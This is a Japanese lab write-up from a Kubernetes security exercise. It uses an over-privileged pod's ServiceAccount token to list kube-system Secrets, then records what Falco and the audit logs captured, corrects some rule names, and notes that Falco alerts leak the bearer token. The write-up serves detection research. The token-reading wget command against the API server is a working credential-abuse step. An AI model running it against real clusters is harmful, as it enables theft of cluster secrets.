## Lab 08: ServiceAccountトークン奪取とRBAC悪用

- MITRE ATT&CK for Containers: T1552.007 (Container API), T1078.004 (Valid Accounts: Cloud Accounts)
- 前提: `over-privileged-sa-pod`（Lab4で作った過剰権限SA`deploy-bot`を紐付け）

### 手順

```bash
kubectl -n lab exec over-privileged-sa-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
wget -qO- --no-check-certificate --header="Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
'
```

### 結果：攻撃は成立

`kube-system`namespaceのSecret一覧（`bootstrap-token-abcdef`等）を取得できた。

### Falcoの検知結果（実測・訂正あり）

本文で書いた「ServiceAccount Token Read」という名前の標準ルールは、**`falco_rules.yaml`に存在しなかった**（`grep -i serviceaccount`では、コメント内の言及が1件ヒットするのみ）。

実際に発火したのは：

```
11:26:00.538074901: Critical Shell spawned without a tty (...)
11:26:00.584545568: Notice Unexpected connection to K8s API Server from container |
  process=wget command=wget ... --header=Authorization: Bearer eyJhbGci... https://kubernetes.default.svc/...
```

**重要な副次的発見**: `Unexpected connection to K8s API Server from container`ルールの出力に、**Bearerトークン全体がそのままコマンドラインとして記録されていた**。Falcoのログ自体が、機密情報（トークン）の二次的な漏洩経路になり得るという、運用上重要な注意点。本番環境でFalcoのアラートをSlack等に転送する場合、このような機密情報のマスキングが必要になる。

### Audit Logsの記録（実測・本文の想定より詳細）

```json
{"verb": "list", "user": {"username": "system:serviceaccount:lab:deploy-bot", ...,
  "extra": {
    "authentication.kubernetes.io/node-name": ["attack-lab-worker"],
    "authentication.kubernetes.io/pod-name": ["over-privileged-sa-pod"],
    "authentication.kubernetes.io/pod-uid": ["1adc7383-..."]
  }},
 "objectRef": {"resource": "secrets", "namespace": "kube-system"}, "responseStatus": {"code": 200}}
```

本文では「Audit Logsでserviceaccount名とsourceIPsしか分からない」という想定だったが、**実際にはBound Service Account Token（K8s 1.22+で標準化）のおかげで、`extra`フィールドに発行元のPod名・Pod UID・ノード名まで自動的に埋め込まれていた**。これは本文の想定より一段精度の高い、ポジティブな実証結果。

### 考察（本文修正用）

- 「ServiceAccount Token Read」という専用ルール名は削除し、実際のルール名（`Unexpected connection to K8s API Server from container`）に訂正する。
- Falcoログ自体のトークン漏洩リスクという新しい論点を追加する価値がある。
- Audit Logsの`extra`フィールドにPod/Node情報が自動付与される点は、本文の記述より強い主張に書き換えられる（Bound Service Account Tokenの効果）。
